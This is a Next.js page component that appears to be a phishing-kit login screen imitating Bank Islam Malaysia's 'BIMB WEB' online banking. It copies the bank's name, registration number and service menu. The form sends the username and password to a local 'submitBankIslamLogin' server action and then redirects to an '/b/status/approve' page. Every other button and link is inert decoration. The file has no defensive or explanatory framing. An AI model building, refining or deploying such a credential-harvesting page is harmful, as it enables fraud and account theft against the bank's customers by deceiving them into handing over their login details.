"use client";

import React, { useState } from "react";
import Image from "next/image";
import { User, Lock, Loader2, Menu, ArrowLeftRight, FileText, Smartphone, Heart, HelpCircle, AlertTriangle } from "lucide-react";
import { submitBankIslamLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function BankIslamLoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitBankIslamLogin(username, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="relative flex min-h-screen flex-col font-sans text-[#333]">
      {/* Background Image with Overlay */}
      <div
        className="absolute inset-0 -z-10 bg-cover bg-center bg-no-repeat grayscale-[20%]"
        style={{
          backgroundImage: 'url("https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&q=80&w=2000")',
        }}
      >
        <div className="absolute inset-0 bg-black/40" />
      </div>

      {/* Header */}
      <header className="flex items-center justify-between px-6 py-8 text-white">
        <div className="flex items-center gap-2">
          <span className="text-xl font-bold tracking-tight">BANK ISLAM</span>
          <span className="text-xl font-light opacity-60">|</span>
          <div className="flex flex-col leading-none">
            <span className="text-xl font-bold tracking-tight">BIMB</span>
            <span className="text-[10px] self-end font-medium">WEB</span>
          </div>
        </div>
        <button>
          <Menu size={32} />
        </button>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col items-center px-6 pt-4 pb-12">
        {/* Login Card */}
        <div className="w-full max-w-sm rounded-[32px] bg-white/90 p-8 shadow-2xl backdrop-blur-md">
          <form onSubmit={handleLogin} className="space-y-6">
            {error && (
              <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100">
                {error}
              </div>
            )}

            <div className="space-y-4">
              <div className="relative">
                <div className="absolute left-4 top-4 text-gray-500">
                  <User size={20} />
                </div>
                <input
                  type="text"
                  placeholder="Enter your username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-white py-4 pl-12 pr-4 text-[15px] outline-none transition-all focus:border-[#D83A5F] focus:ring-1 focus:ring-[#D83A5F]"
                  required
                />
              </div>

              <div className="relative">
                <div className="absolute left-4 top-4 text-gray-500">
                  <Lock size={20} />
                </div>
                <input
                  type="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-white py-4 pl-12 pr-4 text-[15px] outline-none transition-all focus:border-[#D83A5F] focus:ring-1 focus:ring-[#D83A5F]"
                  required
                />
              </div>
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="flex w-full items-center justify-center rounded-2xl bg-[#D83A5F] py-4 text-lg font-bold text-white shadow-lg transition-transform active:scale-[0.98] disabled:opacity-80"
            >
              {isLoading ? (
                <Loader2 className="mr-2 h-6 w-6 animate-spin" />
              ) : (
                "Login"
              )}
            </button>
          </form>
        </div>

        {/* Forgot Details Button */}
        <button className="mt-8 rounded-full bg-[#D83A5F] px-6 py-2.5 text-[13px] font-bold text-white shadow-md active:scale-95">
          Forgot Login Details?
        </button>

        {/* Services Grid */}
        <div className="mt-12 grid w-full max-w-sm grid-cols-3 gap-4">
          {[
            { icon: <ArrowLeftRight size={28} className="text-[#D83A5F]" />, label: "Transfer" },
            { icon: <FileText size={28} className="text-[#D83A5F]" />, label: "Pay Bills" },
            { icon: <Smartphone size={28} className="text-[#D83A5F]" />, label: "Reload" },
            { icon: <Heart size={28} className="text-[#D83A5F]" />, label: "Sadaqa" },
            { icon: <HelpCircle size={28} className="text-[#D83A5F]" />, label: "Help Centre" },
            { icon: <AlertTriangle size={28} className="text-[#D83A5F]" />, label: "Kill Switch" }
          ].map((item, i) => (
            <div key={i} className="flex flex-col items-center justify-center gap-2 rounded-2xl bg-white/95 p-4 shadow-lg text-center">
              {item.icon}
              <span className="text-[12px] font-bold text-gray-700">{item.label}</span>
            </div>
          ))}
        </div>

        {/* Footer Links */}
        <div className="mt-12 text-center">
          <div className="mb-4 flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] font-bold text-white">
            <span>About Bank Islam</span>
            <span className="opacity-40">|</span>
            <span>Terms & Conditions</span>
          </div>
          <div className="mb-6 flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] font-bold text-white">
            <span>Client Charter</span>
            <span className="opacity-40">|</span>
            <span>How to Use</span>
          </div>
          <button className="text-[13px] font-bold text-white underline decoration-white/40 underline-offset-4">
            Privacy Notice
          </button>
        </div>

        {/* Copyright */}
        <p className="mt-10 px-8 text-center text-[11px] leading-tight text-white/70">
          © 2026 Bank Islam Malaysia Berhad Reg. No. 198301002944 (98127-X) All rights reserved.
        </p>
      </main>
    </div>
  );
}
